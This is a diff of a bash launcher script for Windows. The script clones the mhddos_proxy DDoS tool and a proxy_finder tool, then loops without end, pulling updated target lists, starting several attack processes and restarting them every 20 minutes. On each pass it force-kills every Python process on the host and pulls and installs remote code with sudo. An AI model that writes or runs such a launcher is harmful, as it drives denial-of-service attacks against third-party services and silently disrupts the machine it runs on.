@@ -1,25 +1,35 @@
 #!/bin/bash
 
+#Just in case kill previous copy of scripts
+echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
+taskkill -f -im python.exe
+taskkill -f -im python3.8.exe
+taskkill -f -im python3.9.exe
+taskkill -f -im python3.10.exe
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"
+
 #Installing files into correct directory
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling files into correct directories...\033[0;0m\n"
+sleep 3
 cd ~
 rm -rf mhddos_proxy
 rm -rf runner_for_windows
+rm -rf proxy_finder
 git clone https://github.com/alexnest-ua/runner_for_windows.git
 git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+git clone https://github.com/porthole-ascend-cinnamon/proxy_finder.git
 cd ~/mhddos_proxy
 python -m pip install -r requirements.txt
+cd ~/proxy_finder
+python -m pip install -r requirements.txt
+sleep 3
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mFiles installed successfully\033[1;0m\n\n"
 
 restart_interval="20m"
 
 ulimit -n 1048576
 
-#Just in case kill previous copy of mhddos_proxy
-echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
-taskkill -f -im python.exe
-taskkill -f -im python3.8.exe
-taskkill -f -im python3.9.exe
-taskkill -f -im python3.10.exe
-echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+
 
 num_of_copies="${1:-1}"
 if [[ "$num_of_copies" == "all" ]];
@@ -80,10 +90,6 @@ echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;32mStarting attack
 sleep 7s
 
 
-
-
-
-
 # Restart attacks and update targets list every 20 minutes
 while [ 1 == 1 ]
 do	
@@ -105,6 +111,22 @@ do
 		sleep 3s
 	fi
 	
+	cd ~/proxy_finder	
+
+	num0=$(sudo git pull origin main | grep -P -c 'Already|Уже')
+   	echo "$num0"
+   	
+   	if ((num0 == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date proxy_finder"
+	else
+		cd ~/mhddos_proxy
+		sudo pip3 install -r requirements.txt
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated proxy_finder"
+		sleep 2s
+	fi
 	
 	cd ~/runner_for_windows
    	num=$(git pull origin main | grep -P -c 'Already|Уже')
@@ -151,6 +173,9 @@ do
             
             cd ~/mhddos_proxy
             python runner.py $cmd_line --rpc $rpc -t $threads $vpn $debug&
+	    cd ~/proxy_finder
+	    python finder.py&
+	    
             echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    	done
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval...\033[1;0m"
@@ -158,12 +183,12 @@ do
 	clear
    	
    	#Just in case kill previous copy of mhddos_proxy
-   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with ddos"
    	taskkill -f -im python.exe
 	taskkill -f -im python3.8.exe
 	taskkill -f -im python3.9.exe
 	taskkill -f -im python3.10.exe
-   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with ddos killed\033[0;0m\n"
 	
    	no_ddos_sleep="$(shuf -i 1-2 -n 1)m"
    	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[36mSleeping $no_ddos_sleep without DDoS to let your computer cool down...\033[0m\n"
